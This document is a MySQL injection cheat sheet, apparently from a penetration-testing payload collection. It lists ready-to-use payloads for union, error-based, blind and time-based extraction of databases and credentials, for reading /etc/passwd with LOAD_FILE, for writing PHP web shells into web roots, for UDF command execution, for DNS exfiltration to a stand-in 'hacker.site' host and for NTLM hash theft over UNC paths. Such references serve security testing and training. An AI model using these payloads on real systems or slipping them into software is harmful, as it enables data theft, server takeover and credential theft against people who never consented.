# MYSQL Injection

## Summary

* [MYSQL Comment](#mysql-comment)
* [Detect columns number](#detect-columns-number)
* [MYSQL Union Based](#mysql-union-based)
    * [Extract database with information_schema](#extract-database-with-information-schema)
    * [Extract data without information_schema](#extract-data-without-information-schema)
    * [Extract data without columns name](#extract-data-without-columns-name)
* [MYSQL Error Based](#mysql-error-based)
    * [MYSQL Error Based - Basic](#mysql-error-based---basic)
    * [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
    * [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
* [MYSQL Blind](#mysql-blind)
    * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
    * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make-set)
    * [MYSQL Blind with LIKE](#mysql-blind-with-like)
* [MYSQL Time Based](#mysql-time-based)
* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
* [MYSQL Current queries](#mysql-current-queries)
* [MYSQL Read content of a file](#mysql-read-content-of-a-file)
* [MYSQL Write a shell](#mysql-write-a-shell)
* [MYSQL UDF command execution](#mysql-udf-command-execution)
* [MYSQL Truncation](#mysql-truncation)
* [MYSQL Out of band](#mysql-out-of-band)
    * [DNS exfiltration](#dns-exfiltration)
    * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
* [References](#references)


## MYSQL comment

```sql
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MYSQL version 3.23.02
```


## MYSQL Union Based

### Extract database with information_schema

First you need to know the number of columns, you can use `order by`.

```sql
order by 1
order by 2
order by 3
...
order by XXX
```

Then the following codes will extract the databases'name, tables'name, columns'name.

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

### Extract columns name without information_schema

Method for `MySQL >= 4.1`.

First extract the column number with 
```sql
?id=(1)and(SELECT * from db.users)=(1)
-- Operand should contain 4 column(s)
```

Then extract the column name.
```sql
?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
--Column 'id' cannot be null
```

Method for `MySQL 5`

```sql
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
--#1060 - Duplicate column name 'id'

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
-- #1060 - Duplicate column name 'name'

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
...
```

### Extract data without columns name 

Extracting data from the 4th column without knowing its name.

```sql
select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
```

Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```





## MYSQL Error Based

### MYSQL Error Based - Basic

Works with `MySQL >= 4.1`

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```

### MYSQL Error Based - UpdateXML function

```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Shorter to read:

```sql
' and updatexml(null,concat(0x0a,version()),null)-- -
' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### MYSQL Error Based - Extractvalue function

Works with `MySQL >= 5.1`

```sql
AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```

## MYSQL Blind

### MYSQL Blind with substring equivalent

```sql
?id=1 and substring(version(),1,1)=5
?id=1 and right(left(version(),1),1)=5
?id=1 and left(version(),1)=4
?id=1 and ascii(lower(substr(Version(),1,1)))=51
?id=1 and (select mid(version(),1,1)=4)
```

### MYSQL Blind using a conditional statement

TRUE: `if @@version starts with a 5`:

```sql
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
Response:
HTTP/1.1 500 Internal Server Error
```

False: `if @@version starts with a 4`:

```sql
2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
Response:
HTTP/1.1 200 OK
```

### MYSQL Blind with MAKE_SET

```sql
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```

### MYSQL Blind with LIKE

['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
```

## MYSQL Time Based

```sql
+BENCHMARK(40000000,SHA1(1337))+
'%2Bbenchmark(3200,SHA1(1))%2B'
' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2

AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))

?id=1 and IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 and IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
```

## MYSQL DIOS - Dump in One Shot

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

## MYSQL Current queries

This table can list all operations that DB is performing at the moment.

```sql
union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

-- Dump in one shot example for the table content.
union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## MYSQL Read content of a file

Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```

If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MYSQL Write a shell

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
-1 UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

## MYSQL Truncation

In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.

## MYSQL UDF command execution

First you need to check if the UDF are installed on the server.

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

Then you can use functions such as `sys_exec` and `sys_eval`.

```sql
$ mysql -u root -p mysql
Enter password: [...]
mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```


## MYSQL Out of band

```powershell
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
```

### DNS exfiltration

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC Path - NTLM hash stealing

```sql
select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\\\error\\abc';
select 'osanda' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
```

## References

- [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
- [[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
- [Help по MySql инъекциям - rdot.org](https://rdot.org/forum/showpost.php?p=114&postcount=1)
- [SQL Truncation Attack - Warlock](https://resources.infosecinstitute.com/sql-truncation-attack/)
- [HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman](https://hackerone.com/reports/508123)
- [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
- [ekoparty web_100 - 2016/10/26 - p4-team](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)